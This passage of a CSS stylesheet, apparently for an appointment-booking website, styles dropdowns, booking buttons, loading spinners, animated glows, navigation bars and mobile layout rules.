        .camera-capture__actions .contact-form__submit-button {
            margin: 0 !important;
            width: 100%;
        }

        /* Custom Dropdown (Select Replacement) */
        .custom-select-wrapper {
            position: relative;
            user-select: none;
            width: 100%;
            margin-bottom: 0;
        }

        .custom-select {
            position: relative;
            display: flex;
            flex-direction: column;
        }

        .custom-select__trigger {
            position: relative;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 1rem;
            padding-right: 2.8rem; /* Space for arrow */
            font-size: 1rem;
            color: var(--text-white);
            background: var(--input-bg);
            border: none;
            border-radius: 0.8rem;
            cursor: pointer;
            transition: all 0.3s ease;
            box-sizing: border-box;
            line-height: 1.3;
            font-weight: 800;
            box-shadow: 0 4px 0 rgba(58, 42, 26, 0.35);
        }

        /* Arrow indicator */
        .custom-select__trigger::after {
            content: '';
            position: absolute;
            right: 1.1rem;
            top: 50%;
            transform: translateY(-50%);
            width: 1rem; height: 1rem;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%23ffffff' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-size: contain;
            transition: transform 0.3s ease;
        }

        .custom-select.open .custom-select__trigger {
            background: #f4ece2;
            color: #5a3d2a;
            box-shadow: 0 4px 0 rgba(58, 42, 26, 0.45);
        }

        .custom-select.open .custom-select__trigger::after {
            transform: translateY(-50%) rotate(180deg);
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%235a3d2a' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
        }

        .custom-select__trigger span {
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            font-weight: 800;
        }

        .custom-options {
            position: absolute;
            display: block;
            top: 100%;
            left: 0; right: 0;
            background: rgba(242, 231, 218, 0.97);
            backdrop-filter: blur(1.3rem);
            -webkit-backdrop-filter: blur(1.3rem);
            border: none;
            border-radius: 1.6rem; /* All corners rounded */
            box-shadow: 0 5px 0 rgba(58, 42, 26, 0.28);
            z-index: 100;
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
            transform: translateY(0);
            transition: all 0.3s ease;
            max-height: none;
            overflow: visible;
            padding: 0.5rem 0;
        }

        .custom-select.open .custom-options {
            opacity: 1;
            visibility: visible;
            pointer-events: all;
            transform: translateY(0);
        }

        #bookingModal .custom-select--city {
            --city-options-open-height: 18rem;
        }

        #bookingModal .custom-select--city .custom-options {
            max-height: 0;
            overflow-y: auto;
            overflow-x: hidden;
            transition: max-height 0.36s cubic-bezier(.22, .61, .36, 1), opacity 0.24s ease, visibility 0.24s ease;
        }

        #bookingModal .custom-select--city .custom-select__trigger.has-city-check {
            padding-right: 2.8rem;
        }

        #bookingModal .custom-select--city .custom-select__trigger.has-city-check::before {
            content: none;
        }

        #bookingModal .custom-select--city.open .custom-options {
            max-height: var(--city-options-open-height, 18rem);
        }

        .custom-option {
            position: relative;
            display: block;
            padding: 0.8rem 1.6rem;
            font-size: 1.1rem;
            font-weight: 800;
            color: rgba(80, 60, 40, 0.85);
            cursor: pointer;
            transition: background 0.2s;
            text-align: left;
        }

        .custom-option.selected {
            background-color: rgba(139, 111, 90, 0.12);
            color: #3a2a1a;
        }

        .custom-option.selected::after {
            content: '\2713';
            position: absolute;
            right: 1.1rem; top: 50%;
            transform: translateY(-50%);
            color: var(--accent-gold);
        }

        #bookingModal #cityCustomSelect .custom-option.selected::after {
            content: ' \2713';
            position: static !important;
            right: auto !important;
            top: auto !important;
            transform: none !important;
        }

        .footer-book-btn {
            position: relative;
            display: inline-block;
            padding: 0.72rem 1.85rem;
            background: #5a3d2a;
            color: #ffffff;
            font-size: 0.9rem;
            font-weight: 800;
            border: 1px solid #5a3d2a;
            border-radius: 999px;
            cursor: pointer;
            text-decoration: none;
            text-align: center;
            margin: 0 auto;
            overflow: visible;
            transition: background-color 0.2s ease, box-shadow 0.2s ease;
            box-shadow: none;
            min-width: 15rem;
        }
        .footer-book-btn::before {
            content: none;
        }
        .footer-book-btn:hover {
            transform: none;
            background: #ffffff;
            border-color: #ffffff;
            color: #5a3d2a;
            box-shadow: none;
        }
        .footer-book-btn:hover::before {
            content: none;
        }

        .footer-book-btn:hover #headerBookBtnText,
        .footer-book-btn:hover #headerBookBtnText span,
        .footer-book-btn:hover #footerBookBtnText,
        .footer-book-btn:hover #footerBookBtnText span {
            color: #5a3d2a !important;
        }

        button,
        [role="button"],
        .footer-book-btn,
        .contact-form__submit-button,
        .slot-btn,
        .calendar-nav-btn,
        .slots-nav-arrow,
        .file-attach__btn {
            transition: transform 0.2s ease;
        }

        button:hover,
        [role="button"]:hover,
        .footer-book-btn:hover,
        .contact-form__submit-button:hover,
        .calendar-nav-btn:hover,
        .slots-nav-arrow:hover,
        .file-attach__btn:hover {
            transform: scale(1.01) !important;
        }

        .services-list .header__content-text {
            transition: transform 0.2s ease;
        }

        .services-list .header__content-text:hover {
            transform: scale(1.03);
        }

        #headerBookBtn {
            padding: 0.8rem 2rem !important;
            font-size: 1rem !important;
            width: auto !important;
            min-width: 14rem !important;
            max-width: 96% !important;
            min-height: 4.5rem !important;
            border-radius: 999px !important;
            margin-bottom: 0 !important;
        }

        #headerBookBtnText,
        #headerBookBtnText span,
        #footerBookBtnText,
        #footerBookBtnText span {
            font-family: 'Lato', sans-serif !important;
            font-size: clamp(1.2rem, 4vw, 2rem) !important;
            font-weight: 900 !important;
            color: #ffffff !important;
            line-height: 1 !important;
            letter-spacing: 0.06em !important;
            text-transform: uppercase !important;
        }

        #headerBookBtnText,
        #footerBookBtnText {
            position: static;
            display: block;
            width: 100%;
            max-width: none;
            text-align: center;
            pointer-events: none;
            white-space: normal;
        }

        #headerBookBtnText .header-book-line1 {
            font-weight: 900 !important;
        }

        .header-nearest-slot-hint {
            margin: 0.15rem auto 0;
            min-height: 1.4em;
            text-align: center;
            font-family: 'Lato', sans-serif;
            font-size: 1.2rem;
            font-weight: 500;
            line-height: 1.6;
            letter-spacing: 0.01em;
            color: rgba(255, 255, 255, 0.9);
            opacity: 0;
            transition: opacity 0.25s ease;
            pointer-events: none;
            padding: 0 0.4rem;
            max-width: max-content;
            text-shadow: 0 0 0.25rem rgba(255, 255, 255, 0.22);
        }

        .header-nearest-slot-hint--visible {
            opacity: 1;
            animation: headerNearestHintGlow 1.85s ease-in-out infinite;
        }

        @keyframes headerNearestHintGlow {
            0%, 100% {
                text-shadow: 0 0 0.25rem rgba(255, 255, 255, 0.2), 0 0 0.65rem rgba(255, 255, 255, 0.12);
            }
            50% {
                text-shadow: 0 0 0.45rem rgba(255, 255, 255, 0.42), 0 0 1.05rem rgba(255, 255, 255, 0.24);
            }
        }

        #footerBookBtn {
            padding: 1.25rem 3.2rem !important;
            width: auto !important;
            min-width: 21.5rem !important;
            max-width: 96% !important;
            min-height: 6.9rem !important;
            border-radius: 999px !important;
            transition: none !important;
            transform: none !important;
            margin-bottom: 0.9rem !important;
        }

        #footerBookBtn::before {
            transition: none !important;
        }

        #footerBookBtn:hover {
            transform: none !important;
            box-shadow: none !important;
        }

        #footerBookBtn:hover::before {
            content: none !important;
        }

        /* Bottom book button: same font, keep existing dynamic sizes */
        #footerBookBtn,
        #footerBookBtnText,
        #footerBookBtnText span {
            font-family: 'Lato', sans-serif !important;
        }

        .spark {
            position: absolute;
            width: var(--spark-size, 0.55rem);
            height: var(--spark-size, 0.55rem);
            pointer-events: none;
            opacity: 0;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23ffffff' d='M12 1.8l2.68 6.5 7.01.56-5.34 4.58 1.62 6.82L12 16.89 6.03 20.26l1.62-6.82-5.34-4.58 7.01-.56z'/%3E%3C/svg%3E");
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            z-index: 3;
            filter: drop-shadow(0 0 0.55rem rgba(255, 255, 255, 1)) drop-shadow(0 0 1.15rem rgba(255, 255, 255, 0.8));
            will-change: transform, opacity;
            transform: translate(-50%, -50%) translate3d(0, 0, 0);
            animation: sparkle var(--spark-duration, 500ms) cubic-bezier(0.18, 0.72, 0.24, 1) var(--spark-delay, 0ms) forwards;
        }

        @keyframes sparkle {
            0% {
                transform: translate(-50%, -50%) translate3d(0, 0, 0) scale(0.48) rotate(var(--spark-rotate, 0deg));
                opacity: 0;
            }
            14% {
                opacity: 1;
            }
            72% {
                transform: translate(-50%, -50%) translate3d(var(--x-mid, 0px), var(--y-mid, 0px), 0) scale(1.32) rotate(calc(var(--spark-rotate, 0deg) + 130deg));
                opacity: 0.95;
            }
            100% {
                transform: translate(-50%, -50%) translate3d(var(--x-end, 0px), var(--y-end, 0px), 0) scale(1.08) rotate(calc(var(--spark-rotate, 0deg) + 205deg));
                opacity: 0;
            }
        }

        @keyframes hypnoticPulse {
            0% { text-shadow: 0 0 0.3rem rgba(255, 255, 255, 0.2); opacity: 0.6; }
            50% { text-shadow: 0 0 1.3rem rgba(255, 255, 255, 0.9), 0 0 0.6rem rgba(255, 255, 255, 0.7); opacity: 1; color: #fff; }
            100% { text-shadow: 0 0 0.3rem rgba(255, 255, 255, 0.2); opacity: 0.6; }
        }

        .hypnotic-text {
            animation: hypnoticPulse 1.5s infinite ease-in-out;
        }

        /* Day Navigation in Slots Section */
        .slots-nav {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 2.5rem 0 2rem;
            padding: 0 0.6rem;
            width: 100%;
        }

        .slots-nav--loading .slots-nav-arrow {
            display: none;
        }

        .slots-nav-arrow {
            background: rgba(255, 255, 255, 0);
            border: none;
            color: #ffffff;
            font-size: 1.8rem; /* Consistent with calendar nav */
            cursor: pointer;
            width: 3.1rem;
            height: 3.1rem;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: all 0.3s ease;
            opacity: 0.7;
            user-select: none;
            padding: 0;
            line-height: 1;
        }

        .slots-nav-arrow:hover {
            background: rgba(255, 255, 255, 0.1);
            opacity: 1;
            transform: scale(1.1);
        }

        .slots-nav-arrow:active {
            transform: scale(0.95);
        }

        #slotsDayDisplay {
            font-size: 2.8rem;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: #ffffff;
            text-shadow: 0 1px 1px rgba(0,0,0,0.1);
            text-align: center;
            flex-grow: 1;
            margin: 0;
            transition: opacity 0.5s ease, transform 0.5s ease;
            line-height: 1.2;
            display: flex; 
            align-items: center;
            justify-content: center;
            min-height: 3.1rem;
        }

        /* Block: Month Switch Overlay */
        .month-switch-overlay {
            position: fixed;
            inset: 0;
            display: none;
            align-items: center;
            justify-content: center;
            background: rgba(18, 12, 8, 0.45);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            z-index: 35000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.18s linear;
        }

        .month-switch-overlay--active {
            display: flex;
            opacity: 1;
            pointer-events: auto;
        }

        .month-switch-overlay__progress {
            width: min(84vw, 36rem);
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 0.7rem;
        }

        .month-switch-overlay__bar {
            width: 100%;
            height: 0.62rem;
            border-radius: 999px;
            overflow: hidden;
            background: rgba(255, 255, 255, 0.14);
            border: 1px solid rgba(255, 255, 255, 0.24);
            box-shadow: 0 0 18px rgba(255, 255, 255, 0.12);
        }

        .month-switch-overlay__fill {
            width: 0%;
            height: 100%;
            border-radius: inherit;
            background: linear-gradient(90deg, rgba(255,255,255,0.45), rgba(255,255,255,0.95));
            box-shadow: 0 0 16px rgba(255, 255, 255, 0.55);
            transition: width 0.12s linear;
            will-change: width;
        }

        .month-switch-overlay__percent {
            font-size: clamp(1rem, 3.6vw, 1.55rem);
            font-weight: 900;
            letter-spacing: 1.6px;
            color: #ffffff;
            line-height: 1;
            min-width: 4ch;
            text-align: center;
            text-shadow: 0 0 12px rgba(255, 255, 255, 0.45);
        }

        /* Block: Global Spinner Overlay */
        .global-spinner {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.75); /* Darker backdrop as before */
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            z-index: 99999;
            display: none;
            flex-direction: row;
            align-items: center;
            justify-content: center;
        }

        .global-spinner__ring-wrap {
            width: 11.3rem;
            height: 11.3rem;
            position: relative;
            display: grid;
            place-items: center;
        }

        .global-spinner__svg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            transform: rotate(-90deg);
            overflow: visible;
        }

        .global-spinner__track {
            fill: transparent;
            stroke: rgba(255, 255, 255, 0.2);
            stroke-width: 12;
        }

        .global-spinner__glow {
            fill: none;
            stroke: #ffffff;
            stroke-width: 12;
            stroke-linecap: round;
            stroke-dasharray: 302;
            stroke-dashoffset: 302;
            transition: stroke-dashoffset 0.18s linear;
            filter: drop-shadow(0 0 14px rgba(255, 255, 255, 0.45));
            animation: globalSpinnerGlow 2.2s ease-in-out infinite;
        }

        .global-spinner--indeterminate .global-spinner__glow {
            stroke-dashoffset: 76;
            animation: globalSpinnerGlow 1.5s ease-in-out infinite;
        }

        .global-spinner--hypnotic .global-spinner__glow {
            stroke: #ffe29a;
            animation: globalSpinnerHypnotic 1.05s ease-in-out infinite;
            filter: drop-shadow(0 0 14px rgba(255, 226, 154, 0.66)) drop-shadow(0 0 28px rgba(255, 226, 154, 0.4));
        }

        .global-spinner--hypnotic .global-spinner__value {
            color: #fff1bf;
            text-shadow: 0 0 10px rgba(255, 226, 154, 0.72), 0 0 24px rgba(255, 226, 154, 0.35);
            animation: globalSpinnerValueHypnotic 1.1s ease-in-out infinite;
        }

        .global-spinner__value {
            position: relative;
            z-index: 2;
            color: #ffffff;
            font-weight: 900;
            font-size: 1.34rem;
            letter-spacing: 1px;
            text-shadow: 0 0 12px rgba(255, 255, 255, 0.45);
            user-select: none;
        }

        @keyframes globalSpinnerHypnotic {
            0%, 100% {
                transform: scale(1);
                filter: drop-shadow(0 0 12px rgba(255, 226, 154, 0.5)) drop-shadow(0 0 20px rgba(255, 226, 154, 0.28));
            }
            50% {
                transform: scale(1.045);
                filter: drop-shadow(0 0 20px rgba(255, 226, 154, 0.9)) drop-shadow(0 0 36px rgba(255, 226, 154, 0.45));
            }
        }

        @keyframes globalSpinnerValueHypnotic {
            0%, 100% { opacity: 0.88; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.06); }
        }

        @keyframes globalSpinnerGlow {
            0%, 100% {
                filter: drop-shadow(0 0 10px rgba(212, 184, 154, 0.45));
                transform: scale(1);
            }
            50% {
                filter: drop-shadow(0 0 30px rgba(255, 255, 255, 1));
                transform: scale(1.05);
            }
        }

        .dot-jump {
            display: inline-block;
            animation: dotJump 1.4s infinite ease-in-out both;
        }
        .dot-jump:nth-child(2) { animation-delay: 0.2s; }
        .dot-jump:nth-child(3) { animation-delay: 0.4s; }

        @keyframes dotJump {
            40% { transform: translateY(-0.6rem); }
        }

        .fade-out {
            opacity: 0;
            transform: translateY(-0.6rem);
        }
        .fade-in {
            opacity: 1;
            transform: translateY(0);
        }

        /* Preloader Error State Text */
        .book-btn-preloader--error .book-btn-preloader__text {
            color: #ff2f45;
            font-size: 1.08rem;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 2.2px;
            position: absolute;
            left: 50%;
            bottom: -1.72rem;
            transform: translateX(-50%);
            width: max-content;
            white-space: nowrap;
            text-shadow: 0 0 14px rgba(255, 47, 69, 0.6), 0 0 28px rgba(255, 47, 69, 0.28);
            animation: slotNotFoundPulse 0.9s ease-in-out infinite;
            pointer-events: none;
        }

        @keyframes slotNotFoundPulse {
            0%, 100% {
                opacity: 0.62;
                transform: translateX(-50%) scale(1);
                filter: drop-shadow(0 0 0 rgba(255, 76, 76, 0));
            }
            50% {
                opacity: 1;
                transform: translateX(-50%) scale(1.12);
                filter: drop-shadow(0 0 12px rgba(255, 47, 69, 0.6));
            }
        }

        @keyframes hypnoticCirclePulse {
            0% { filter: drop-shadow(0 0 10px rgba(212, 184, 154, 0.5)); stroke: #D4B89A; transform: scale(1); }
            50% { filter: drop-shadow(0 0 30px rgba(255, 255, 255, 1)); stroke: #ffffff; transform: scale(1.05); }
            100% { filter: drop-shadow(0 0 10px rgba(212, 184, 154, 0.5)); stroke: #D4B89A; transform: scale(1); }
        }

        .book-btn-preloader--hypnotic .book-btn-preloader__progress {
            /* Keep it visually at 100% */
            stroke-dashoffset: 0 !important;
            animation: hypnoticCirclePulse 1.5s ease-in-out infinite !important;
        }
        
        .book-btn-preloader--error .book-btn-preloader__progress {
            stroke: #ff4c4c !important;
            filter: drop-shadow(0 0 15px rgba(255, 76, 76, 0.8)) !important;
            animation: none !important;
            stroke-dashoffset: 0 !important; /* Force fully filled */
        }

        /* Book Button Error State */
        .book-btn-preloader--error .book-btn-preloader__circle {
            stroke: rgba(255, 51, 51, 0.15); /* Light red track */
            animation: pulseError 1.5s infinite ease-in-out;
        }

        @keyframes pulseError {
            0%, 100% { stroke-opacity: 0.5; stroke-width: 3; }
            50% { stroke-opacity: 1; stroke-width: 4; }
        }

        /* Book Button Offline State */
        .book-btn-preloader--offline .book-btn-preloader__text {
            color: #ffe14f;
            font-size: 1.02rem;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 1.9px;
            position: absolute;
            left: 50%;
            bottom: -1.72rem;
            transform: translateX(-50%);
            width: max-content;
            white-space: nowrap;
            text-shadow: 0 0 10px rgba(255, 225, 79, 0.75), 0 0 26px rgba(255, 204, 0, 0.55);
            animation: offlineTextHypnotic 1.15s ease-in-out infinite;
            pointer-events: none;
        }

        @keyframes offlineTextHypnotic {
            0%, 100% {
                opacity: 0.7;
                transform: translateX(-50%) scale(1);
                filter: drop-shadow(0 0 0 rgba(255, 204, 0, 0));
            }
            50% {
                opacity: 1;
                transform: translateX(-50%) scale(1.08);
                filter: drop-shadow(0 0 12px rgba(255, 221, 102, 0.95));
            }
        }

        .book-btn-preloader--offline .book-btn-preloader__progress {
            stroke: #ffd23f !important;
            stroke-dashoffset: 0 !important; /* Keep circle fully filled */
            filter: drop-shadow(0 0 12px rgba(255, 214, 85, 0.9)) drop-shadow(0 0 26px rgba(255, 194, 51, 0.6)) !important;
            animation: offlineCircleHypnotic 1.1s ease-in-out infinite !important;
        }

        .book-btn-preloader--offline .book-btn-preloader__circle {
            stroke: rgba(255, 214, 85, 0.26);
            animation: offlineTrackPulse 1.3s ease-in-out infinite;
        }

        @keyframes offlineCircleHypnotic {
            0%, 100% {
                stroke-width: 12;
                transform: scale(1);
                opacity: 0.85;
            }
            50% {
                stroke-width: 13.4;
                transform: scale(1.045);
                opacity: 1;
            }
        }

        @keyframes offlineTrackPulse {
            0%, 100% {
                stroke-opacity: 0.45;
                stroke-width: 11;
            }
            50% {
                stroke-opacity: 0.95;
                stroke-width: 12.8;
            }
        }

        /* Hide Spinners on Number Inputs */
        input[type=number]::-webkit-inner-spin-button, 
        input[type=number]::-webkit-outer-spin-button { 
            -webkit-appearance: none; 
            margin: 0; 
        }
        input[type=number] {
            appearance: textfield;
            -moz-appearance: textfield;
        }

        /* Playful Jump Animation for Last Slot Text */
        @keyframes playfulJump {
            0%, 30%, 100% { transform: scale(1); }
            15% { transform: scale(1.02); }
        }

        /* ------------------- TOP BAR & NAVIGATION (Auto-hiding) ------------------- */
        .top-bar {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 7.5rem;
            background: rgba(255, 255, 255, 0.01);
            backdrop-filter: blur(1.3rem);
            -webkit-backdrop-filter: blur(1.3rem);
            z-index: 10000;
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            padding: 0.9rem 1.3rem 0;
            border-bottom: 1px solid var(--glass-border);
            opacity: 1;
            transform: translateY(0);
            pointer-events: auto;
            transition: opacity 0.25s ease, transform 0.25s ease;
            -webkit-mask-image: linear-gradient(to bottom, rgba(0,0,0,0.85), transparent);
            mask-image: linear-gradient(to bottom, rgba(0,0,0,0.85), transparent);
        }

        .top-bar--visible {
            opacity: 1;
            transform: translateY(0);
            transition: opacity 2.5s ease-in-out, transform 2.5s ease-in-out;
        }

        .bottom-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 7.5rem;
            background: rgba(255, 255, 255, 0.01);
            backdrop-filter: blur(1.3rem);
            -webkit-backdrop-filter: blur(1.3rem);
            z-index: 10000;
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
            padding: 0 1.3rem 0.9rem;
            border-top: 1px solid var(--glass-border);
            opacity: 1;
            transform: translateY(0);
            pointer-events: none;
            transition: opacity 0.25s ease, transform 0.25s ease;
            -webkit-mask-image: linear-gradient(to top, rgba(0,0,0,0.85), transparent);
            mask-image: linear-gradient(to top, rgba(0,0,0,0.85), transparent);
        }

        .services-content {
            text-align: left;
            margin: 3.8rem 0;
            padding: 2.5rem;
        }
        .services-content ul {
            list-style: none;
            padding: 0;
        }
        .services-content li {
            padding-bottom: 2rem;
            margin-bottom: 2rem;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        .services-content li:last-child {
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }
        .services-content h3 {
            color: var(--text-white);
            margin-bottom: 1rem;
            font-size: 1.2rem;
            text-transform: uppercase;
            font-weight: 800;
        }
        .services-content p {
            font-size: 1rem;
            font-weight: 400;
            color: rgba(255,255,255,0.92);
            line-height: 1.7;
            text-align: left;
            letter-spacing: 0.01em;
            margin-bottom: 1.3rem;
        }

        .bottom-bar--visible {
            opacity: 1;
            transform: translateY(0);
            transition: opacity 2.5s ease-in-out, transform 2.5s ease-in-out;
        }

        /* Preloader for Book Button */
        .book-btn-preloader {
            display: grid;
            place-items: center;
            width: 11.3rem;
            height: 11.3rem;
            position: relative;
            margin: 0 auto;
            filter: blur(0);
            transition:
                opacity 1.2s cubic-bezier(0.22, 1, 0.36, 1),
                transform 1.2s cubic-bezier(0.22, 1, 0.36, 1),
                filter 1.2s cubic-bezier(0.22, 1, 0.36, 1);
            will-change: opacity, transform, filter;
        }

        .book-btn-preloader__text {
            font-size: 1rem;
            font-weight: 800;
            color: #fff;
            text-shadow: 0 1px 2px rgba(0,0,0,0.2);
            text-align: center;
            line-height: 1.3;
            z-index: 2;
            position: relative;
        }

        .book-btn-preloader__text--loading {
            font-size: 1rem;
            font-weight: 400;
            letter-spacing: 0.01em;
            line-height: 1.7;
            color: rgba(255, 255, 255, 0.96);
            text-shadow: 0 0 0.28rem rgba(255, 255, 255, 0.22);
            animation: preloaderLoadingHypnoticGlow 1.08s ease-in-out infinite;
        }

        .book-btn-preloader__text--typing::after {
            content: '|';
            margin-left: 0.08em;
            opacity: 0.95;
            animation: preloaderTypingCaretBlink 0.72s steps(1, end) infinite;
        }

        @keyframes preloaderTypingCaretBlink {
            0%, 49% { opacity: 0.95; }
            50%, 100% { opacity: 0; }
        }

        @keyframes preloaderLoadingHypnoticGlow {
            0%, 100% {
                text-shadow: 0 0 0.2rem rgba(255, 255, 255, 0.18);
                opacity: 0.88;
            }
            50% {
                text-shadow: 0 0 0.5rem rgba(255, 255, 255, 0.48), 0 0 0.22rem rgba(255, 255, 255, 0.35);
                opacity: 1;
            }
        }

        .book-btn-preloader__svg {
            position: absolute;
            top: 0; left: 0;
            width: 100%;
            height: 100%;
            transform: rotate(-90deg); /* Start from top */
            overflow: visible; /* Prevent glow from clipping square box */
        }

        .book-btn-preloader__circle {
            fill: transparent;
            stroke: rgba(255, 255, 255, 0.2);
            stroke-width: 12;
            backdrop-filter: blur(0.6rem);
            -webkit-backdrop-filter: blur(0.6rem);
        }

        .book-btn-preloader__progress {
            fill: none;
            stroke: #ffffff;
            stroke-width: 12;
            stroke-linecap: round;
            stroke-dasharray: 302; /* Circumference: 2 * pi * 48 */
            stroke-dashoffset: 302; 
            filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.42));
            animation: 
                fillProgress 19s ease-out forwards, /* Increased by 5s */
                hypnoticCircleGlow 3s infinite ease-in-out;
        }

        @keyframes fillProgress {
            0% { stroke-dashoffset: 302; }
            100% { stroke-dashoffset: 0; } 
        }

        @keyframes hypnoticCircleGlow {
            0%, 100% { filter: drop-shadow(0 0 2px rgba(255, 255, 255, 0.1)); }
            50% { filter: drop-shadow(0 0 1rem rgba(255, 255, 255, 0.9)); }
        }

        .book-btn-container {
            position: relative;
            height: 11.3rem; /* Adjust height to fit preloader */
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 2.5rem auto;
        }

        .book-btn-container--footer {
            overflow: visible;
            min-height: 11.3rem;
        }
@media (prefers-reduced-motion: reduce) {
        }

        .book-btn-wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: var(--hero-book-gap-bottom);
        }

        .book-btn-wrapper .book-btn-container {
            margin: var(--hero-book-gap-top) auto 0;
        }

        #headerBookBtnWrap {
            margin: 0 auto !important;
        }

        .footer__copyright { 
            font-size: 1rem;
            font-weight: 400;
            color: rgba(255,255,255,0.92);
            line-height: 1.7;
            text-align: center;
            letter-spacing: 0.01em;
            margin-bottom: 1.3rem; 
            margin-top: 0;
            transition: opacity 2s ease 1s; /* 1s delay */
        }
        
        /* Specialized fade-in class for elements needing a delay */
        .fade-in-delayed {
            opacity: 0;
            transform: translateY(15px);
            transition: opacity 2s ease 1s, transform 2s ease 1s; /* 1s delay */
        }

        .fade-in-delayed.is-visible {
            opacity: 1;
            transform: translateY(0);
        }

        /* Unified paragraph style (matches "Identification Requirement" text blocks) */
        .header__content-text,
        .services-content p,
        .faq__answer p,
        .privacy-block p,
        .modal__text,
        .price-note {
            font-family: 'Lato', sans-serif;
            font-size: 1.2rem !important;
            font-weight: 400 !important;
            color: rgba(255, 255, 255, 0.92) !important;
            line-height: 1.6 !important;
            letter-spacing: 0.01em;
            text-align: left;
            margin-bottom: 0.72rem;
        }

        .footer__hours,
        .footer__copyright {
            font-family: 'Lato', sans-serif !important;
            font-size: 1.2rem !important;
            font-weight: 400 !important;
            color: rgba(255, 255, 255, 0.92) !important;
            line-height: 1.6 !important;
            letter-spacing: 0.01em !important;
            text-align: center !important;
            width: 100%;
        }
.footer .blur-in-section {
            margin-top: 20rem !important;
            transition: opacity 0.75s ease-out, filter 0.75s ease-out;
        }

        /* Slightly larger spacing between major content blocks */
        .header__content-block,
        .header__service-item,
        .contact-form,
        .footer {
            margin-bottom: var(--major-block-gap) !important;
        }

        .faq__item {
            margin-bottom: 1.2rem;
        }

        .layout-container > .contact-form,
        .layout-container > .faq,
        .layout-container > .privacy-block {
            margin-bottom: var(--layout-stack-gap);
        }

        .layout-container > .faq {
            max-width: calc(45.25rem - 10px);
            margin-left: auto;
            margin-right: auto;
            padding: 0 1.3rem;
        }

        /* Standalone privacy block under the map */
        .privacy-block--map {
            max-width: calc(45.25rem - 10px);
            margin: clamp(2.6rem, 6vw, 4rem) auto 0;
            padding: 0 1.3rem;
            color: rgba(255,255,255,0.9);
            font-size: 1rem;
            line-height: 1.6;
            text-align: left;
        }

        .layout-container > .faq + .privacy-block--map {
            margin-top: clamp(5rem, 11vw, 7.8rem);
        }

        @media (max-width: 768px) {
            .calendar-wrapper {
                --calendar-reserve-min-height: clamp(32rem, 66vh, 40rem);
            }

            .calendar-grid {
                min-height: clamp(14rem, 30vh, 18rem);
            }

            .slots-block {
                min-height: clamp(6rem, 12vh, 8.2rem);
            }

            .book-btn-container--footer {
                min-height: 6.5rem;
            }

            body {
                padding-bottom: 0;
            }

            .top-bar,
            .bottom-bar {
                height: 5.9rem;
                padding-left: 0.8rem;
                padding-right: 0.8rem;
            }

            .top-bar {
                padding-top: 0.6rem;
            }

            .bottom-bar {
                padding-bottom: 0.6rem;
            }

            .header {
                max-width: 100%;
                padding: 1.15rem 0.85rem 1.75rem 0.5rem;
            }

            .header__subtitle {
                margin-bottom: 1.3rem;
                letter-spacing: -1px;
            }

            .header__description {
                font-size: clamp(0.95rem, 4.6vw, 1.15rem);
                padding: 0 clamp(0.5rem, 3.2vw, 0.85rem);
                gap: 0.35rem;
            }

            .header__description span {
                width: max-content;
                max-width: none;
                white-space: nowrap;
                text-wrap: nowrap;
                overflow-wrap: normal;
                word-break: keep-all;
            }

            .header__contact {
                padding: 0 0.2rem !important;
                margin-bottom: 1.25rem !important;
            }

            .header__contact--hero {
                margin-bottom: var(--hero-phone-button-gap) !important;
                padding: 0 clamp(0.35rem, 2.5vw, 0.6rem) !important;
            }

            .header__phone-link {
                font-size: clamp(1rem, 4vw, 1.3rem);
                line-height: 1.2;
            }

            .header__content-block {
                margin: 2.8rem auto 2rem;
                width: min(97vw, 41rem);
                padding-left: clamp(0.45rem, 2.4vw, 0.9rem);
                padding-right: clamp(0.45rem, 2.4vw, 0.9rem);
            }

            .header__content-header {
                margin: 2rem 0 1.35rem;
                text-align: center;
                width: 100%;
            }

            .header__content-text,
            .services-content p,
            .faq__answer,
            .faq__answer p,
            .privacy-block p,
            .modal__text,
            .price-note {
                font-size: 1rem !important;
                line-height: 1.5 !important;
            }

            .faq__question {
                font-size: 0.98rem;
                gap: 0.6rem;
                padding-right: 1.75rem;
            }

            .faq__answer {
                padding-left: 1.85rem;
                padding-right: 1.4rem;
            }

            .layout-container {
                max-width: 100%;
                padding: 0 0.85rem;
            }

            #headerBookBtn {
                width: 100% !important;
                max-width: 20rem !important;
                padding: 0.8rem 1.4rem !important;
                border-radius: 999px !important;
            }

            .book-btn-wrapper {
